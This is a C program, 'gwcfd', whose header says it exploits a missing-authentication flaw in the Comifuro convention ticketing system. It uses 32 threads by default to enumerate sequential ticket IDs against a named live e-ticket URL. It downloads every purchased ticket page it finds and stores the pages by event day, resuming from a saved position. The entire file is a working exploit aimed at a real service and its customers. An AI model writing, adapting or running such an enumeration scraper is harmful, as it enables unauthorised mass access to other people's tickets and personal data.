// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2023  Alviro Iskandar Setiawan <alviro.iskandar@gnuweeb.org>
 *
 * gwcfd is a simple multithreaded high-performance Comifuro ticket var dumper
 * for GNU/Weeb. The comifuro ticket selling system has a vulnerability that
 * allows anyone to access the purchased tickets without any authentication.
 *
 * Inspired by Moe Poi's comifuro ticket var dumper.
 * Link: https://t.me/GNUWeeb/720657
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <getopt.h>
#include <signal.h>
#include <stdbool.h>
#include <pthread.h>
#include <curl/curl.h>
#include <stdatomic.h>
#include <sys/stat.h>
#include <sys/types.h>

#define GWCFD_VERSION "0.1"
#define DEFAULT_NR_THREADS 32

/*
 * The comifuro ticket selling started at 2023-04-16 16:00:00 GMT+7.
 *
 * Thanks to Sulu E. Julianto for the datetime.
 */
static uint64_t g_start_tid = 16816356000000ull;

static volatile bool g_stop = false;

struct gwcfd_ctx;

struct gwcfd_curl_data {
	char			*buf;
	size_t			len;
	size_t			allocated;
};

struct gwcfd_thread {
	pthread_t		thread;
	CURL			*curl;
	struct gwcfd_ctx	*ctx;
	struct gwcfd_curl_data	cdata;
};

struct gwcfd_ctx {
	const char		*out_dir;
	char			*day1_dir;
	char			*day2_dir;
	char			*misc_dir;
	bool			has_start_tid;
	uint16_t		nr_thread;
	uint64_t		start_tid;
	uint64_t		end_tid;
	_Atomic(uint64_t)	tid_pos;
	struct gwcfd_thread	*threads;
};

#define pr_err(...) fprintf(stderr, __VA_ARGS__)
#define pr_debug(...) fprintf(stderr, __VA_ARGS__)

static const struct option long_options[] = {
	{ "help",	no_argument,		NULL,	'h' },
	{ "version",	no_argument,		NULL,	'v' },
	{ "threads",	required_argument,	NULL,	't' },
	{ "out-dir",	required_argument,	NULL,	'o' },
	{ "start-tid",	required_argument,	NULL,	's' },
	{ "end-tid",	required_argument,	NULL,	'e' },
	{ NULL,		0,			NULL,	0 },
};

static const char short_options[] = "hvt:o:s:e:";

static void show_help(void)
{
	printf("Usage: gwcfd [options]\n");
	printf("Options:\n");
	printf("  -h, --help\t\tShow this help message\n");
	printf("  -v, --version\t\tShow version information\n");
	printf("  -t, --threads\t\tNumber of threads to use\n");
	printf("  -o, --out-dir\t\tOutput directory\n");
	printf("  -s, --start-tid\tStart ticket ID (default: last_tid file or %llu)\n", (unsigned long long)g_start_tid);
	printf("  -e, --end-tid\t\tEnd ticket ID (default: non-stop)\n");
}

static void show_version(void)
{
	printf("gwcfd version %s\n", GWCFD_VERSION);
	printf("Comifuro ticket var dumper\n");

	/*
	 * Print my copyright and short GPL v2 license.
	 */
	printf("Copyright (C) 2023  Alviro Iskandar Setiawan <alviro.iskandar@gnuweeb.org>\n");
	printf("This program is free software; you can redistribute it and/or modify\n");
	printf("it under the terms of the GNU General Public License as published by\n");
	printf("the Free Software Foundation; version 2.\n");
	printf("This program is distributed in the hope that it will be useful,\n");
	printf("but WITHOUT ANY WARRANTY; without even the implied warranty of\n");
	printf("MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n");
	printf("GNU General Public License for more details.\n");
}

static void interrupt_handler(int sig)
{
	(void)sig;
	g_stop = true;
}

static int install_signal_handlers(void)
{
	struct sigaction sa = { .sa_handler = interrupt_handler };
	int ret;

	ret = sigaction(SIGINT, &sa, NULL);
	if (ret < 0)
		goto out_err;
	ret = sigaction(SIGTERM, &sa, NULL);
	if (ret < 0)
		goto out_err;
	ret = sigaction(SIGHUP, &sa, NULL);
	if (ret < 0)
		goto out_err;

	sa.sa_handler = SIG_IGN;
	ret = sigaction(SIGPIPE, &sa, NULL);
	if (ret < 0)
		goto out_err;

	return 0;

out_err:
	pr_err("Failed to install signal handlers: %s\n", strerror(errno));
	return -1;
}

static int parse_argv(int argc, char *argv[], struct gwcfd_ctx *ctx)
{
	int c, nr_threads = DEFAULT_NR_THREADS;

	ctx->end_tid = -1ull;
	while (1) {
		c = getopt_long(argc, argv, short_options, long_options, NULL);
		if (c == -1)
			break;

		switch (c) {
		case 'h':
			show_help();
			return 1;
		case 'v':
			show_version();
			return 1;
		case 't':
			nr_threads = atoi(optarg);
			break;
		case 'o':
			ctx->out_dir = optarg;
			break;
		case 's':
			ctx->start_tid = strtoull(optarg, NULL, 10);
			ctx->has_start_tid = true;
			break;
		case 'e':
			ctx->end_tid = strtoull(optarg, NULL, 10);
			break;
		default:
			pr_err("Unknown option: %s\n", argv[optind - 1]);
			return -1;
		}
	}

	if (optind < argc) {
		pr_err("Unknown option: %s\n", argv[optind]);
		return -1;
	}

	if (nr_threads < 1) {
		pr_err("Number of threads must be greater than 0\n");
		return -1;
	}

	if (nr_threads > 1024) {
		pr_err("Number of threads cannot be greater than 1024\n");
		return -1;
	}

	ctx->nr_thread = (uint16_t)nr_threads;
	return 0;
}

static int init_thread_array(struct gwcfd_ctx *ctx)
{
	size_t i;

	ctx->threads = calloc(ctx->nr_thread, sizeof(struct gwcfd_thread));
	if (!ctx->threads) {
		pr_err("Failed to allocate memory for threads\n");
		return -1;
	}

	for (i = 0; i < ctx->nr_thread; i++) {
		ctx->threads[i].curl = curl_easy_init();
		if (!ctx->threads[i].curl) {
			pr_err("Failed to initialize curl\n");
			return -1;
		}
		ctx->threads[i].ctx = ctx;
	}

	return 0;
}

static int cf_mkdir(const char *path)
{
	int ret;

	ret = mkdir(path, 0755);
	if (ret < 0 && errno != EEXIST) {
		pr_err("Failed to create directory %s: %s\n", path,
		       strerror(errno));
		return -1;
	}

	return 0;
}

static int init_output_storage(struct gwcfd_ctx *ctx)
{
	const char *out = ctx->out_dir;
	size_t len;
	int ret;

	if (!out)
		out = ".";

	len = strlen(out);
	ctx->day1_dir = malloc(len + 6);
	ctx->day2_dir = malloc(len + 6);
	ctx->misc_dir = malloc(len + 6);
	if (!ctx->day1_dir || !ctx->day2_dir || !ctx->misc_dir) {
		pr_err("Failed to allocate memory for output directory\n");
		goto out;
	}

	snprintf(ctx->day1_dir, len + 6, "%s/day1", out);
	snprintf(ctx->day2_dir, len + 6, "%s/day2", out);
	snprintf(ctx->misc_dir, len + 6, "%s/misc", out);

	ret = cf_mkdir(ctx->day1_dir);
	if (ret < 0)
		goto out;
	ret = cf_mkdir(ctx->day2_dir);
	if (ret < 0)
		goto out;
	ret = cf_mkdir(ctx->misc_dir);
	if (ret < 0)
		goto out;

	return 0;

out:
	free(ctx->day1_dir);
	free(ctx->day2_dir);
	free(ctx->misc_dir);
	return -1;
}

static size_t comifuro_write_cb(void *ptr, size_t size, size_t nmemb, void *data)
{
	struct gwcfd_thread *thread = data;
	struct gwcfd_curl_data *d = &thread->cdata;
	size_t len = size * nmemb;
	size_t new_len = d->len + len;

	if (new_len > d->allocated) {
		size_t new_alloc = new_len + 8192;
		char *new_buf;

		if (new_alloc < new_len)
			new_alloc = new_len;

		new_buf = realloc(d->buf, new_alloc);
		if (!new_buf) {
			pr_err("Failed to allocate memory for curl data\n");
			return 0;
		}

		d->buf = new_buf;
		d->allocated = new_alloc;
	}

	memcpy(d->buf + d->len, ptr, len);
	d->buf[new_len] = '\0';
	d->len = new_len;
	return len;
}

static int comifuro_detect_day(const char *data)
{
	if (strstr(data, "Day 2"))
		return 2;
	else if (strstr(data, "Day 1"))
		return 1;
	else
		return 0; // Unknown format.
}

static int comifuro_ticket_save(struct gwcfd_ctx *ctx, uint64_t tid, const char *data)
{
	char fpath[PATH_MAX];
	const char *day_path;
	FILE *fp;

	switch (comifuro_detect_day(data)) {
	case 1:
		day_path = ctx->day1_dir;
		pr_debug("Saving ticket day 1 %llu\n", (unsigned long long)tid);
		break;
	case 2:
		day_path = ctx->day2_dir;
		pr_debug("Saving ticket day 2 %llu\n", (unsigned long long)tid);
		break;
	case 0:
		day_path = ctx->misc_dir;
		pr_err("Unknown day for ticket %llu\n", (unsigned long long)tid);
		break;
	}

	snprintf(fpath, sizeof(fpath), "%s/%llu.html", day_path,
		 (unsigned long long)tid);

	fp = fopen(fpath, "w");
	if (!fp) {
		pr_err("Failed to open file %s: %s\n", fpath, strerror(errno));
		return -1;
	}

	fwrite(data, 1, strlen(data), fp);
	fclose(fp);
	return 0;
}

static int comifuro_fetch_ticket(struct gwcfd_thread *thread, uint64_t tid)
{
	CURL *curl = thread->curl;
	char url[512];
	CURLcode res;
	long code;

	memset(&thread->cdata, 0, sizeof(thread->cdata));

	snprintf(url, sizeof(url), "https://eticket.kiostix.com/e/%llu",
		 (unsigned long long)tid);

	curl_easy_setopt(curl, CURLOPT_URL, url);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, comifuro_write_cb);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, thread);
	curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
	res = curl_easy_perform(curl);
	if (res != CURLE_OK) {
		pr_err("Failed to fetch ticket %llu: %s\n",
		       (unsigned long long)tid, curl_easy_strerror(res));
		return -1;
	}

	/*
	 * Get the HTTP response code, so that we can handle 404s.
	 */
	res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
	if (res != CURLE_OK) {
		free(thread->cdata.buf);
		pr_err("Failed to get HTTP response code for ticket %llu: %s\n",
		       (unsigned long long)tid, curl_easy_strerror(res));
		return -1;
	}

	if (code == 200) {
		comifuro_ticket_save(thread->ctx, tid, thread->cdata.buf);
	} else if (code == 404) {
		// pr_debug("Ticket %llu not found\n", (unsigned long long)tid);
	} else {
		pr_err("Unexpected HTTP response code %ld for ticket %llu\n",
		       code, (unsigned long long)tid);
	}

	free(thread->cdata.buf);
	return 0;
}

static uint64_t comifuro_get_tid(struct gwcfd_ctx *ctx)
{
	return atomic_fetch_add_explicit(&ctx->tid_pos, 1ull, memory_order_acq_rel);
}

static void *comifuro_var_thread_worker(void *arg)
{
	struct gwcfd_thread *thread = arg;
	struct gwcfd_ctx *ctx = thread->ctx;
	uint64_t tid;
	int ret;

	while (!g_stop) {
		tid = comifuro_get_tid(ctx);
		if (tid > ctx->end_tid)
			break;
		ret = comifuro_fetch_ticket(thread, tid);
		if (ret < 0)
			break;
	}

	return NULL;
}

static void save_last_tid(struct gwcfd_ctx *ctx)
{
	uint64_t tid = atomic_load_explicit(&ctx->tid_pos, memory_order_relaxed);
	char fpath[PATH_MAX];
	FILE *fp;

	snprintf(fpath, sizeof(fpath), "%s/last_tid", ctx->misc_dir);
	printf("\nSaving last tid %llu to %s\n", (unsigned long long)tid, fpath);
	fp = fopen(fpath, "w");
	if (!fp) {
		pr_err("Failed to open file %s: %s\n", fpath, strerror(errno));
		return;
	}

	fprintf(fp, "%llu\n", (unsigned long long)tid);
	fclose(fp);
}

static void try_load_last_tid(struct gwcfd_ctx *ctx)
{
	unsigned long long tid;
	char fpath[PATH_MAX];
	FILE *fp;

	snprintf(fpath, sizeof(fpath), "%s/last_tid", ctx->misc_dir);
	fp = fopen(fpath, "r");
	if (!fp) {
		pr_err("Failed to open file %s: %s\n", fpath, strerror(errno));
		return;
	}

	if (fscanf(fp, "%llu", &tid) != 1) {
		pr_err("Failed to read last tid from %s\n", fpath);
		fclose(fp);
		return;
	}

	fclose(fp);
	atomic_store_explicit(&ctx->tid_pos, tid, memory_order_relaxed);
	printf("Resuming from last tid %llu\n", (unsigned long long)tid);
}

static int start_comifuro_ticket_var_dumper(struct gwcfd_ctx *ctx)
{
	size_t i;
	int ret;

	atomic_store_explicit(&ctx->tid_pos, g_start_tid, memory_order_relaxed);

	if (!ctx->has_start_tid)
		try_load_last_tid(ctx);

	for (i = 1; i < ctx->nr_thread; i++) {
		pthread_t *thr;
		void *arg;

		thr = &ctx->threads[i].thread;
		arg = &ctx->threads[i];
		ret = pthread_create(thr, NULL, comifuro_var_thread_worker, arg);
		if (ret) {
			pr_err("Failed to create thread %zu: %s\n", i, strerror(ret));
			return -1;
		}
	}

	comifuro_var_thread_worker(&ctx->threads[0]);
	save_last_tid(ctx);
	return 0;
}

static void gwcfd_ctx_destroy(struct gwcfd_ctx *ctx)
{
	size_t i;

	free(ctx->day1_dir);
	free(ctx->day2_dir);
	free(ctx->misc_dir);

	if (!ctx->threads)
		return;

	for (i = 0; i < ctx->nr_thread; i++) {
		if (!ctx->threads[i].curl)
			continue;

		if (i > 0)
			pthread_join(ctx->threads[i].thread, NULL);

		curl_easy_cleanup(ctx->threads[i].curl);
	}
	free(ctx->threads);
}

int main(int argc, char *argv[])
{
	struct gwcfd_ctx ctx;
	int ret;

	ret = install_signal_handlers();
	if (ret)
		return ret;

	memset(&ctx, 0, sizeof(ctx));
	ret = parse_argv(argc, argv, &ctx);
	if (ret)
		return ret;

	ret = curl_global_init(CURL_GLOBAL_ALL);
	if (ret != CURLE_OK) {
		pr_err("curl_global_init() failed: %s\n", curl_easy_strerror(ret));
		return -1;
	}

	ret = init_thread_array(&ctx);
	if (ret)
		goto out;

	ret = init_output_storage(&ctx);
	if (ret)
		goto out;

	ret = start_comifuro_ticket_var_dumper(&ctx);
out:
	gwcfd_ctx_destroy(&ctx);
	curl_global_cleanup();
	return 0;
}
